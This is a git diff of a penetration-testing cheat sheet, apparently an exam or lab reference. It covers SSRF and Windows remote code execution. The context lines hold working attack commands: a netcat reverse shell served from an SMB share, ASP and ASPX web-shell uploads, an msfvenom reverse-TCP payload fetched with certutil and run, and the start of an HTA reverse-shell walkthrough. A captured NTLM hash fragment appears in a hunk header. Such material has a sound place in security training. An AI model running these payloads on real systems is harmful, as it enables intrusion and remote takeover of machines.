@@ -677,17 +677,21 @@ enox::HEIST:4c153c5e0d81aee9:4F46F09B4B79350EA32DA7815D1F0779:01010000000000006E
 SSRF vulnerabilities occur when an attacker has full or partial control of the request sent by the web application. A common example is when an attacker can control the third-party service URL to which the web application makes a request.
 
 <img src="https://user-images.githubusercontent.com/127046919/224167289-d416f6b0-f256-4fd8-b7c2-bcdc3c474637.png" width="250" height="240" />
+
 #### Example attack
+
 ````
 python3 -m http.server 80
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 192.168.146.172 - - [09/Mar/2023 16:39:17] code 404, message File not found
 192.168.146.172 - - [09/Mar/2023 16:39:17] "GET /test.html HTTP/1.1" 404 -
 ````
+
 ````
 http://192.168.119.146/test.html
 http://192.168.119.146/test.hta
 ````
+
 ## Exploitation <img src="https://cdn-icons-png.flaticon.com/512/2147/2147286.png" width="40" height="40" />
 ### Windows rce techniques
 ````
@@ -696,10 +700,12 @@ smbserver.py -smb2support Share .
 nc -nlvp 80
 cmd.exe /c //<your kali IP>/Share/nc.exe -e cmd.exe <your kali IP> 80
 ````
+
 ````
 cp /usr/share/webshells/asp/cmd-asp-5.1.asp . #IIS 5
 ftp> put cmd-asp-5.1.asp
 ````
+
 ````
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=<your kali IP> LPORT=<port you designated> -f exe -o ~/shell.exe
 python3 -m http.server 80
@@ -707,6 +713,7 @@ certutil -urlcache -split -f http://<your kali IP>/shell.exe C:\\Windows\temp\sh
 cmd /c C:\\Windows\\temp\\shell.exe
 C:\inetpub\wwwroot\shell.exe #Path to run in cmd.aspx, click Run
 ````
+
 ````
 cp /usr/share/webshells/aspx/cmdasp.aspx .
 cp /usr/share/windows-binaries/nc.exe .
@@ -716,6 +723,7 @@ http://<target $IP>:<port>/cmdasp.aspx
 nc -nlvp <port on your kali>
 cmd.exe /c //192.168.119.167/Share/nc.exe -e cmd.exe <your kali $IP> <your nc port>
 ````
+
 ### HTA Attack in Action
 We will use msfvenom to turn our basic HTML Application into an attack, relying on the hta-psh output format to create an HTA payload based on PowerShell. In Listing 11, the complete reverse shell payload is generated and saved into the file evil.hta.
 ````
